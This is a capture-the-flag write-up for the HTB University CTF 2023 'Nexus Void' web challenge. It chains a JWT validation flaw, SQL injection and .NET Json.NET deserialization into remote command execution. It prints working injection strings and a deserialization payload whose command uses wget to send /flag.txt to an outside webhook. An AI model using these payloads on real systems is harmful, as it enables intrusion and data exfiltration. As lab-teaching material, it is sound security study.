---
title: Nexus Void - HTB University CTF 2023
date: 2023-12-15 16:31:03
author: Luc1f3r
author_url: https://twitter.com/Adithyaraj2515
categories:
  - Web
tags:
  - HTBUniversityCTF2023
  - .NET Deserialization
  - Writeup
  - SQL Injection
  - JWT
---

**tl;dr**

+ Misconfiguration in JWT token validation
+ SQL Injection through JWT token
+ Insecure Deserialization in .NET leading to RCE using custom class StatusCheckHelper

<!--more-->

**Challenge Points**: 325
**Solved by**: [Luc1f3r](https://twitter.com/Adithyaraj2515),[Winters](https://twitter.com/ArunKr1shnan),[Z_Pacifist](https://twitter.com/ZePacifist),[L0xm1](https://twitter.com/L0xm1_07)

## Challenge Description
Disturbingly, a group of malicious individuals has initiated the sale of a dangerous weapon created using 'Serum XY' on the black market, with the intention of unleashing chaos by turning people into zombies. Is it possible for you to employ your hacking skills to dismantle this black market operation and prevent the weapon from falling into the wrong hands?

## Analysis
The challenge has 
1 - /login endpoint -> Login Page
2 - /Login/Create endpoint -> Register page
3 - /home endpoint -> Where the products are listed.
4 - /uptime endpoint -> Which shows the total time the server has been running.
5 - /status endpoint -> Which will show memory usage,cpu usage and the disk storage.

Lets look at the important parts of the code, starting with the login and register functions of the page.
```cs
    [HttpPost]
    public IActionResult Index(UserModel userModel)
    {
        string sqlQuery = $"SELECT * FROM Users WHERE username='{userModel.username}' AND password='{userModel.password}'";

        var result = _db.Users.FromSqlRaw(sqlQuery).FirstOrDefault();

        ViewData["Error"] = "Invalid Credentials!";
        return View();
    }
    [HttpPost]
    public IActionResult Create(UserModel userModel)
    {
       
        string checkUserSqlQuery = $"SELECT * FROM Users WHERE username='{userModel.username}'";
        var result = _db.Users.FromSqlRaw(checkUserSqlQuery).FirstOrDefault();
        return View();
    }
```

Here the username and password is inserted into the sqlite3 database. Right away the possiblity of SQL injection can be noticed in the above queries.

Now let's look at the home page. Here there are functions for adding, deleting and selecting wishlist items.
```cs
        .....

        [HttpGet]
        public IActionResult Wishlist()
        {
            string ID = HttpContext.Items["ID"].ToString();

            string sqlQueryGetWishlist = $"SELECT * from Wishlist WHERE ID='{ID}'";
            var wishlist = _db.Wishlist.FromSqlRaw(sqlQueryGetWishlist).FirstOrDefault();

            if (wishlist != null && !string.IsNullOrEmpty(wishlist.data))
            {
                List<ProductModel> products = SerializeHelper.Deserialize(wishlist.data);
                return View(products);
            }
            else
            {
                List<ProductModel> products = null;
                return View(products);
            }
        }
        [HttpPost]
        public IActionResult Wishlist(string name, string sellerName)
        {
            string ID = HttpContext.Items["ID"].ToString();
            string sqlQueryGetWishlist = $"SELECT * from Wishlist WHERE ID={ID}";
            var wishlist = _db.Wishlist.FromSqlRaw(sqlQueryGetWishlist).FirstOrDefault();
            string sqlQueryProduct = $"SELECT * from Products WHERE name='{name}' AND sellerName='{sellerName}'";
            var product = _db.Products.FromSqlRaw(sqlQueryProduct).FirstOrDefault();
            if(!string.IsNullOrEmpty(product.name))
            {
                if (wishlist != null && !string.IsNullOrEmpty(wishlist.data))
                {
                    List<ProductModel> products = SerializeHelper.Deserialize(wishlist.data);
                    ProductModel result = products.Find(x => x.name == product.name);
                    if (result != null)
                    {
                        return Content("Product already exists");
                    }
                    products.Add(product);
                    string serializedData = SerializeHelper.Serialize(products);
                    string sqlQueryAddWishlist = $"UPDATE Wishlist SET data='{serializedData}' WHERE ID={ID}";
                    _db.Database.ExecuteSqlRaw(sqlQueryAddWishlist);
                }
                else
                {
                    string username = HttpContext.Items["username"].ToString();
                    List<ProductModel> wishListProducts = new List<ProductModel>();
                    wishListProducts.Add(product);
                    string serializedData = SerializeHelper.Serialize(wishListProducts);
                    string sqlQueryAddWishlist = $"INSERT INTO Wishlist(ID, username, data) VALUES({ID},'{username}', '{serializedData}')";
                    _db.Database.ExecuteSqlRaw(sqlQueryAddWishlist);
                }
                return Content("Added");
            }
            return Content("Invalid");
        }
```

There is also a JWT middleware which will check if the JWT token inside the cookie is valid or not each time a user visits any endpoint.

```cs
public class JWTMiddleware
    {
        private readonly RequestDelegate _next;
        private readonly IConfiguration _configuration;

        public JWTMiddleware(RequestDelegate next, IConfiguration configuration)
        {
            _next = next;
            _configuration = configuration;
        }

        public async Task InvokeAsync(HttpContext context)
        {
            string jwtToken = context.Request.Cookies["Token"];

            JWTHelper _jwtHelper = new JWTHelper(_configuration);

            string validateToken = _jwtHelper.ValidateToken(jwtToken);

            if (validateToken.Equals("false"))
            {
                context.Response.Redirect("/");
            }

            string username = _jwtHelper.getClaims(jwtToken, "username");
            string ID = _jwtHelper.getClaims(jwtToken, "ID");

            context.Items["username"] = username;
            context.Items["ID"] = ID;
            await _next(context);
        }
    }
```

Now lets look at the /status endpoint. This endpoint creates an object for the class StatusCheckHelper.

```cs
[Route("/status")]
[HttpGet]
public IActionResult Status()
{
    StatusCheckHelper statusCheckHelper = new StatusCheckHelper();

    statusCheckHelper.command = "bash /tmp/cpu.sh";
    string cpuUsage = statusCheckHelper.output;

    return Content($"CPU Usage: {cpuUsage}\nMemory Usage: {memoryUsage}\nDisk Space: {diskUsage}");
}

//Given below is the StatusCheckHelper class 

public class StatusCheckHelper
    {
        public string output { get; set; }
        private string _command;
        public string command 
        {
            get { return _command; }
            set
            {
                _command = value;
                try
                {
                    var p = new System.Diagnostics.Process();

                    var processStartInfo = new ProcessStartInfo()
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = $"/bin/bash",
                        WorkingDirectory = "/tmp",
                        Arguments = $"-c \"{_command}\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    };
                    p.StartInfo = processStartInfo;
                    p.Start();
                    output = p.StandardOutput.ReadToEnd();
                }
                catch 
                {
                    output = "Something went wrong!";
                } 
            }
        }
    }
```

The flag is stored as a file on the server. The /status endpoint is used to excecute some system information commands stored in /tmp/cpu.sh and more. It utilizes the StatusCheckHelper class to execute commands which we can possibly exploit to read flag from /flag.txt.


## Exploitation

The exploit can be split in 2 parts.


### 1st Part - Object Deserialization

Invoking the StatusCheckHelper class leads to command execution. In order to do that we can perform a deserialization attack.

In the wishlist endpoint, it is calling the `Deserialize()` function from the `SerializeHelper` class. Let's look more into it.

```cs
public static List<ProductModel> Deserialize(string str) 
        {
            string decodedData = EncodeHelper.Decode(str);

            var deserialized = JsonConvert.DeserializeObject(decodedData, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            });

            List<ProductModel> products = deserialized as List<ProductModel>;

            return products;
        }
```

The `Deserialize()` function decodes the base64 encoding and then deserializes it using JsonConvert class which is part of Newtonsoft. Wierdly it uses the `TypeNameHandling = TypeNameHandling.All`. 
Enabling TypeNameHandling to anything other than None is vulnerable to insecure deserialization vulnerablity.

> Following TypeNameHandlings are vulnerable against deserialization attack:
TypeNameHandling.All
TypeNameHandling.Auto
TypeNameHandling.Arrays
TypeNameHandling.Objects
In fact the only kind that is not vulnerable is the default: TypeNameHandling.None

^ [blog](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html#:~:text=In%20fact%20the%20only%20kind%20that%20is%20not%20vulnerable%20is%20the%20default%3A%20TypeNameHandling.None)

This is also mentioned in the official Json.NET [TypeNameHandling Documentation](https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_JsonSerializer_TypeNameHandling.htm)

So if we give in a base64 encoded serialized object of the class StatusCheckHelper with the commands we want to execute then the function will base64 decode and deserialize the payload, hence executing the command inside it.

The serialized payload can be generated with the following code:

```cs
    static void Main()
    {
        StatusCheckHelper objstatus = new StatusCheckHelper();
        objstatus.command = "ls";
       string serializedResult = JsonConvert.SerializeObject(objstatus, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            });
        Console.WriteLine(serializedResult1);
    }
```

Serialized payload:
`{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","output":null,"command":"ls"}`

We have successfully generated the payload but the next objective is to get the Deserialize function call with the parameter as our malicious payload. 

### 2nd Part - Invalid Validation of JWT tokens plus SQLI

The wishlist endpoint takes the ID from the JWT token and gives it to the SQL query which will fetch the corresponding row. Then the data column of the response will be given to the deserialize function.
Let's look at the JWTHelper class.
```cs
public class JWTHelper
    {
        private readonly IConfiguration _configuration;
        public JWTHelper(IConfiguration configuration) 
        {
            _configuration = configuration;
        }
        public string GenerateJwtToken(string username, string id) 
        {
            var secretKey = Encoding.UTF8.GetBytes(_configuration["JWT:Secret"]);
            var claims = new Claim[] {
                new Claim("username", username),
                new Claim("ID", id)
            };
            var credentials = new SigningCredentials(new SymmetricSecurityKey(secretKey), SecurityAlgorithms.HmacSha256);
            var token = new JwtSecurityToken(_configuration["JWT:Issuer"],
                _configuration["JWT:Issuer"],
                claims,
                expires: DateTime.Now.AddDays(7),
                signingCredentials: credentials
            );
            return new JwtSecurityTokenHandler().WriteToken(token);
        }
        public string ValidateToken(string token)
        {
            var secretKey = Encoding.UTF8.GetBytes(_configuration["JWT:Secret"]);
            var securityKey = new SymmetricSecurityKey(secretKey);
            var Issuer = _configuration["JWT:Issuer"];
            var tokenHandler = new JwtSecurityTokenHandler();
            try 
            {
                tokenHandler.ValidateToken(token, new TokenValidationParameters
                {
                    ValidateIssuerSigningKey = true,
                    ValidateIssuer = true,
                    ValidateAudience = false,
                    ValidIssuer = Issuer,
                    IssuerSigningKey = securityKey
                }, out SecurityToken validatedToken);
                return validatedToken.ToString();
            }
            catch 
            {
                return false.ToString();
            }
        }
    }
```

It's a simple class which implements the functionalities with JWT tokens. 
GenerateJwtToken() - generate a token
ValidateToken() - validate a token
getClaims() - get the value from the token.

In the above code, we found that there is a slight misconfiguration in the application which can be exploited.
Let's compare the JWT middleware and JWTHelper quickly.

In the JWT middleware the check is given like this
```cs
string validateToken = _jwtHelper.ValidateToken(jwtToken);

if (validateToken.Equals("false"))
{
    context.Response.Redirect("/");
}
```
The page will redirect to root if the response from ValidateToken is `false`.

ValidateToken function as per the JWTHelper class will execute the following if the token is invalid.
```cs
catch 
{
    return false.ToString();
}
```
`false.ToString()` will return as `False`. Which is not equal to `false` when checked in the middleware.
This basically translates to the fact that JWT implementation is flawed and even if wrong signature is provided, the application will accept our JWT token instead of redirecting us to the login endpoint.

## Final Exploit

So first we will register and login to the application. Then we will edit the JWT token and change the `ID` value with a SQL Injection payload to manipulate the results of the SQL query and inject our malicious payload into the 'data' field.
```
"ID": "' union select '1','2','<Base64 payload>' as 'data' --"
```
RCE payload = `{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","output":null,"command":"wget <webhook>?msg=$(cat /flag.txt)"}`
Then we visit the wishlist endpoint. Data now has the base64 payload from the above injection and the deserialize function will base64 decode the payload and deserialize it.

This is the method that we used to solve the challenge but later we found out there are other ways to solve it.

## Flag

`HTB{D0tN3t_d3s3r1al1z4t10n_v14_sQL_1NJ3CT10N_1s_fun!}`

## Alternate Methods
### 1->

In the login and register page the username and password field is neither being sanitized nor are they using prepared statements which means SQL Injection is possible. So we could inject second order SQL injection payload in the username while logging in as
`herox' UNION SELECT ALL 8,"herox','<base64 payload>')--", "herox"-- "`

The above payload sets our username as the following.
`herox','<base64 payload')--`
After that when adding a product to the wishlist, it will use the username from our JWT token and since its vulnerable to SQL Injection it will insert our malicious serialized data into the table, and visiting wishlist page will trigger it.

This method is explained in the [HTBWriteup](https://github.com/hackthebox/uni-ctf-2023/tree/main/uni-ctf-2023/web/%5BMedium%5D%20Nexus%20Void)

### 2->
Another method is by using SQL injection, when a product is added to the wishlist. When a product is added to the wishlist it takes product name and sellername from the user. Here the function allows the user to  execute multiple queries seperated by ';'. So we can insert into the wishlist table. If we put below SQL query as the sellername we can insert into the wishlist table. 
`aaa' ; INSERT INTO Wishlist(ID, username, data)  VALUES(2,"test2","serialized") ; `
Then if we go to the wishlist endpoint, this serialized data will be given to the `Deserialize()` function in the wishlist endpoint and the command execution will be triggered. 
 [https://medium.com/@kokomagedd/htb-university-ctf-2023-web-writeups-fcbcc5181b0b](https://medium.com/@kokomagedd/htb-university-ctf-2023-web-writeups-fcbcc5181b0b#:~:text=Nexus%20Void%20challenge)

